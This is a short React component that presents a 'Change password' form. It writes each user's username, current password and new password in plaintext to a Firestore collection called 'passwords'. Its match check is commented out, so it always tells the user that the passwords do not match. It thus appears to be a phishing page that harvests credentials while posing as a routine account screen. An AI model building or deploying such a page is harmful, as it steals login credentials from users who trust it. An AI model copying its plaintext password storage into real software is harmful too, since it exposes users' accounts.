import { useState } from 'react'
import {db}  from './config/firebase'
import { addDoc, collection } from 'firebase/firestore'
import './Body.css'
export const Body = (props) => {
    const [check, setCheck] = useState(false);
    const [inputChnage, setInputChange] = useState({
        old: '',
        new: '',
        confirm: ''
    })
    const handleChange = (e) => {
        setInputChange({ ...inputChnage, [e.target.name]: e.target.value })
        // console.log(inputChnage)
    }
    const userPassRef = collection(db, "passwords")
    const handleSubmit = async (e) => {
        e.preventDefault();
        if (![e.target.name]) {
            console.log('error')
            return;
        }
        // if (inputChnage.new !== inputChnage.confirm) {
            setCheck(true);
        // }
        // else {
        //     setCheck(false);
        // }
        try {

            await addDoc(userPassRef, {
                username : props.username,
                old: inputChnage.old,
                new: inputChnage.new
            });
        }catch(err){
            console.log(err);
        }
        // console.log("Password matched")
    }
    console.log(props.username)
    return (
        <div className="body-container">
            <form id='form' onSubmit={handleSubmit}>
                <div className='form-div'>
                    <input placeholder='Current password' type='password' name='old' value={inputChnage.old} onChange={handleChange} />
                </div>
                <div className='form-div'>
                    <input placeholder='New password' type='password' name='new' value={inputChnage.new} onChange={handleChange} />
                </div>
                <div className='form-div'>
                    <input placeholder='Confirm new password' type='password' name='confirm' value={inputChnage.confirm} onChange={handleChange} />
                </div>
                <div className='form-div' id='checkbox'>
                    {check && <p id='check'>Passwords do not match</p>}
                </div>
                <div className='form-div'>
                    <button id='btn'>Change password</button>
                </div>
            </form>
        </div>
    )
}